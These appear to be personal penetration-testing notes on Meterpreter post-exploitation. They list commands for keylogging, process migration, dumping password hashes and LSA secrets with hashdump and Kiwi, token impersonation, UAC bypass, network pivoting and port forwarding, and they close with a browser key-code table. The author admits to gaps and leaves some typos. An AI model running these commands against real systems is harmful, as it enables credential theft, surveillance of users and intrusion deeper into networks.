## Meterpreter Post-Exploitation

### Key Logging

You can start a keylogger in the context of the current meterpreter session, meaning it will monitor the user that 'owns' the process meterpreter is running under.  

```bash
# Start Keylogger
keyscan_start

# Stop Keylogger
keyscan_stop

# Check logged keystrokes
keyscan_dump
```

If the meterpreter process is running as SYSTEM on Windows, for example, the keylogger will not catch anything because that is a non-interactive user.  To change the context, you must migrate the meterpreter process to a process owned by the desired user.

### Migrating Processes

Remember that Meterpreter is operating under the context of a process and its existence is tied to that process such that if the process ends, so does the Meterpreter session.

The meterpreter process can be migrated to a more reliable process, however.

1. Find a suitable process that will remain persistent and runs in the desired context (ex. explorer)

   ```bash
   ps
   ```

2. Migrate the process to the Process ID of the target process

   ```bash
   migrate PID
   ```

Remember you may only migrate into a process of the same or lower integrity level as the current process.

### Extensions

Extension provide additional functionality to the meterpreter shell.  These can be loaded from within the meterpreter session:

#### Powershell

Allows you to run Powershell commands and scripts.

```bash
# Load the module
load powershell

# Execute a command
powershell_execute "COMMAND"

# Import a Powershell script
powershell_import SCRIPT

# Start a Powershell prompt
powershell_shell
```

#### Incognito

Allows for the extraction of tickets

```bash
# Load extension
load incognito

# List tokens by username
list_tokens -u

# Use a token to impersonate a user
# Note, you must use double-backslash to escape the slash
impetsonate_token domain\\user
```

### Dumping Hashes

#### Hashdump

```bash
# Hashdump could trigger AV
hashdump

# Better to run smart_hashdump
run post/windows/gather/smart_hashdump
```

#### Kiwi

Note: See the help menu for more info:

```bash
# Kiwi
load kiwi

# Elevate to SYSTEM privileges
getsystem

# Dump system credentials
lsa_dump_sam

# No clue what this actually does
creds_msv
```

This is a good page to check out, I just didn't take time to document the stuff on it.  It includes dumping 'secrets' and how to automate the creation of a golden ticket via Kiwi:  https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/

### Dumping Secrets

Idek what this is really, but here it is:

```bash
lsa_dump_secrets
```

### Privilege Escalation

On windows, from the meterpreter prompt:

```bash
run post/multi/recon/local_exploit_suggester
```

#### UAC Bypass

If the meterpereter shell is running in the context of an admin user, you can elevate the privileges of the current shell to a high integrity level, but you must bypass UAC to do so.  

There are several `bypassuac` modules, so check which one works best for the target version of windows.  

1. Background the meterpreter session

   ```bash
   background
   ```

2. Load an appropriate `bypassuac` module

   ```bash
   # Example
   use exploit/windows/local/bypassuac_injection_winsxs
   ```

3. Set the `session` option to the desired meterpeter session & run the module

   ```bash
   set session 1
   run
   ```

### Other Features

```bash
# Capture images of the compromised desktop
screenshot
```

### Meterpreter Pivoting 

You can tunnel traffic through a session which will proxy that traffic through the connected target.

```bash
# Ex. Routes the network through meterpreter session 2
route add 172.16.216.0/24 2

# Show routes
route print
```

NOTE:  When using these routes, shells must use established connections such as `windows/meterpreter/bind_tcp`.    You may NOT use reverse shells since the target will not have  a route back to the target machine.

#### Autoroutes

These can be setup through a meterpreter session automatically.  

1. Background the target meterpeter session

   ```bash
   background
   ```

2. Load the autoroute module

   ```bash
   use multi/manage/autoroute
   ```

3. Specify the session to associate the module with and run it

   ```bash
   set session 2
   run
   ```

#### Combining Routes

With routes defined in MSF, and using SOCKS4 proxy, routes can be combined so that applications outside MSF can proxy through the MSF session pivots.

1. Background the target Meterpreter session

   ```bash
   background
   ```

2. Load the SOCKS4 module

   ```bash
   use auxiliary/server/socks4a
   ```

3. Tell the module to use localhost as the proxy server and run it in the background

   ```bash
   set SRVHOST 127.0.0.1
   run -j
   ```

4. In another terminal, modify the `/etc/proxychains.conf` file and add this socks proxy to the end of it

   ```bash
   # Make sure to check the file for existing entries
   sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'
   # I tried this without calling it as a bash command and it said access denied.  I could use vi though, but this is faster.
   ```

5. Use proxychains to run commands through the proxy

   ```bash
   sudo proxychains rdesktop 172.16.216.5 -d corp.com -u jeff_admin
   ```

#### Port Forwarding

A meterpreter session can be setup to forward a port to the internal network through the session.

```bash
# Show help menu
portfwd -h

# Create a port forwad from localhost 3389 to 3389 on the remote server through the compromised host
portfwd add -l 3389 -p 3389 -r 172.16.216.5
# Options
-l	# Local port to forward from
-p	# Remote port to forward to
-r	# Remote host to forward to
```

## Interacting with a target

Note: You need to migrate to Explorer to send these

```bash
# Send keystrokes verbatim
keyboard_send "this is what is sent"

# Send keystrokes by keycode (check table for codes), needed for special keys
# I guess press is an up/down while `up` is the key lifted up and `down` is the key held down (like with holding alt)
keyevent [press|up|down] <keycode>

# Interact with mouse
# Usage: mouse action (move, click, up, down, rightclick, rightup, rightdown, doubleclick)
#       mouse [x] [y] (click)
#       mouse [action] [x] [y]
#  e.g: 
mouse click
mouse rightclick 1 1
mouse move 640 480

# Click the start menu (estimate, use a large second value to move it to the bottom of the screen)
mouse click 0 1000
```

## Keylogging

NOTE:  You want to migrate to something that has access to what you want to keylog, like `explorer` for regular stuff or `winlogon` for logins.  Migrating to explorer will likely de-elevate privileges.

```bash
pgrep explorer
migrate <PID>
keyscan_start
keyscan_dump
```

## Key Codes

| Key Name                  | event.which | event.key          | event.code     | Notes                                                        |
| ------------------------- | ----------- | ------------------ | -------------- | ------------------------------------------------------------ |
| backspace                 | 8           | Backspace          | Backspace      |                                                              |
| tab                       | 9           | Tab                | Tab            |                                                              |
| enter                     | 13          | Enter              | Enter          |                                                              |
| shift(left)               | 16          | Shift              | ShiftLeft      | `event.shiftKey` is true                                     |
| shift(right)              | 16          | Shift              | ShiftRight     | `event.shiftKey` is true                                     |
| ctrl(left)                | 17          | Control            | ControlLeft    | `event.ctrlKey` is true                                      |
| ctrl(right)               | 17          | Control            | ControlRight   | `event.ctrlKey` is true                                      |
| alt(left)                 | 18          | Alt                | AltLeft        | `event.altKey` is true                                       |
| alt(right)                | 18          | Alt                | AltRight       | `event.altKey` is true                                       |
| pause/break               | 19          | Pause              | Pause          |                                                              |
| caps lock                 | 20          | CapsLock           | CapsLock       |                                                              |
| escape                    | 27          | Escape             | Escape         |                                                              |
| space                     | 32          |                    | Space          | The `event.key` value is a single space.                     |
| page up                   | 33          | PageUp             | PageUp         |                                                              |
| page down                 | 34          | PageDown           | PageDown       |                                                              |
| end                       | 35          | End                | End            |                                                              |
| home                      | 36          | Home               | Home           |                                                              |
| left arrow                | 37          | ArrowLeft          | ArrowLeft      |                                                              |
| up arrow                  | 38          | ArrowUp            | ArrowUp        |                                                              |
| right arrow               | 39          | ArrowRight         | ArrowRight     |                                                              |
| down arrow                | 40          | ArrowDown          | ArrowDown      |                                                              |
| print screen              | 44          | PrintScreen        | PrintScreen    |                                                              |
| insert                    | 45          | Insert             | Insert         |                                                              |
| delete                    | 46          | Delete             | Delete         |                                                              |
| 0                         | 48          | 0                  | Digit0         |                                                              |
| 1                         | 49          | 1                  | Digit1         |                                                              |
| 2                         | 50          | 2                  | Digit2         |                                                              |
| 3                         | 51          | 3                  | Digit3         |                                                              |
| 4                         | 52          | 4                  | Digit4         |                                                              |
| 5                         | 53          | 5                  | Digit5         |                                                              |
| 6                         | 54          | 6                  | Digit6         |                                                              |
| 7                         | 55          | 7                  | Digit7         |                                                              |
| 8                         | 56          | 8                  | Digit8         |                                                              |
| 9                         | 57          | 9                  | Digit9         |                                                              |
| a                         | 65          | a                  | KeyA           |                                                              |
| b                         | 66          | b                  | KeyB           |                                                              |
| c                         | 67          | c                  | KeyC           |                                                              |
| d                         | 68          | d                  | KeyD           |                                                              |
| e                         | 69          | e                  | KeyE           |                                                              |
| f                         | 70          | f                  | KeyF           |                                                              |
| g                         | 71          | g                  | KeyG           |                                                              |
| h                         | 72          | h                  | KeyH           |                                                              |
| i                         | 73          | i                  | KeyI           |                                                              |
| j                         | 74          | j                  | KeyJ           |                                                              |
| k                         | 75          | k                  | KeyK           |                                                              |
| l                         | 76          | l                  | KeyL           |                                                              |
| m                         | 77          | m                  | KeyM           |                                                              |
| n                         | 78          | n                  | KeyN           |                                                              |
| o                         | 79          | o                  | KeyO           |                                                              |
| p                         | 80          | p                  | KeyP           |                                                              |
| q                         | 81          | q                  | KeyQ           |                                                              |
| r                         | 82          | r                  | KeyR           |                                                              |
| s                         | 83          | s                  | KeyS           |                                                              |
| t                         | 84          | t                  | KeyT           |                                                              |
| u                         | 85          | u                  | KeyU           |                                                              |
| v                         | 86          | v                  | KeyV           |                                                              |
| w                         | 87          | w                  | KeyW           |                                                              |
| x                         | 88          | x                  | KeyX           |                                                              |
| y                         | 89          | y                  | KeyY           |                                                              |
| z                         | 90          | z                  | KeyZ           |                                                              |
| left window key           | 91          | Meta               | MetaLeft       | `event.metaKey` is true                                      |
| right window key          | 92          | Meta               | MetaRight      | `event.metaKey` is true                                      |
| select key (Context Menu) | 93          | ContextMenu        | ContextMenu    |                                                              |
| numpad 0                  | 96          | 0                  | Numpad0        |                                                              |
| numpad 1                  | 97          | 1                  | Numpad1        |                                                              |
| numpad 2                  | 98          | 2                  | Numpad2        |                                                              |
| numpad 3                  | 99          | 3                  | Numpad3        |                                                              |
| numpad 4                  | 100         | 4                  | Numpad4        |                                                              |
| numpad 5                  | 101         | 5                  | Numpad5        |                                                              |
| numpad 6                  | 102         | 6                  | Numpad6        |                                                              |
| numpad 7                  | 103         | 7                  | Numpad7        |                                                              |
| numpad 8                  | 104         | 8                  | Numpad8        |                                                              |
| numpad 9                  | 105         | 9                  | Numpad9        |                                                              |
| multiply                  | 106         | *                  | NumpadMultiply |                                                              |
| add                       | 107         | +                  | NumpadAdd      |                                                              |
| subtract                  | 109         | -                  | NumpadSubtract |                                                              |
| decimal point             | 110         | .                  | NumpadDecimal  |                                                              |
| divide                    | 111         | /                  | NumpadDivide   |                                                              |
| f1                        | 112         | F1                 | F1             |                                                              |
| f2                        | 113         | F2                 | F2             |                                                              |
| f3                        | 114         | F3                 | F3             |                                                              |
| f4                        | 115         | F4                 | F4             |                                                              |
| f5                        | 116         | F5                 | F5             |                                                              |
| f6                        | 117         | F6                 | F6             |                                                              |
| f7                        | 118         | F7                 | F7             |                                                              |
| f8                        | 119         | F8                 | F8             |                                                              |
| f9                        | 120         | F9                 | F9             |                                                              |
| f10                       | 121         | F10                | F10            |                                                              |
| f11                       | 122         | F11                | F11            |                                                              |
| f12                       | 123         | F12                | F12            |                                                              |
| num lock                  | 144         | NumLock            | NumLock        |                                                              |
| scroll lock               | 145         | ScrollLock         | ScrollLock     |                                                              |
| audio volume mute         | 173         | AudioVolumeMute    |                | ⚠️ The `event.which` value is 181 in Firefox. Also FF provides the code value as, `VolumeMute` |
| audio volume down         | 174         | AudioVolumeDown    |                | ⚠️ The `event.which` value is 182 in Firefox. Also FF provides the code value as, `VolumeDown` |
| audio volume up           | 175         | AudioVolumeUp      |                | ⚠️ The `event.which` value is 183 in Firefox. Also FF provides the code value as, `VolumeUp` |
| media player              | 181         | LaunchMediaPlayer  |                | ⚠️ The ️`event.which` value is 0(no value) in Firefox. Also FF provides the code value as, `MediaSelect` |
| launch application 1      | 182         | LaunchApplication1 |                | ⚠️ The ️`event.which` value is 0(no value) in Firefox. Also FF provides the code value as, `LaunchApp1` |
| launch application 2      | 183         | LaunchApplication2 |                | ⚠️ The ️`event.which` value is 0(no value) in Firefox. Also FF provides the code value as, `LaunchApp2` |
| semi-colon                | 186         | ;                  | Semicolon      | ⚠️ The `event.which` value is 59 in Firefox                   |
| equal sign                | 187         | =                  | Equal          | ⚠️ The `event.which` value is 61 in Firefox                   |
| comma                     | 188         | ,                  | Comma          |                                                              |
| dash                      | 189         | -                  | Minus          | ⚠️ The `event.which` value is 173 in Firefox                  |
| period                    | 190         | .                  | Period         |                                                              |
| forward slash             | 191         | /                  | Slash          |                                                              |
| Backquote/Grave accent    | 192         | `                  | Backquote      |                                                              |
| open bracket              | 219         | [                  | BracketLeft    |                                                              |
| back slash                | 220         | \                  | Backslash      |                                                              |
| close bracket             | 221         | ]                  | BracketRight   |                                                              |
| single quote              | 222         | '                  | Quote          |                                                              |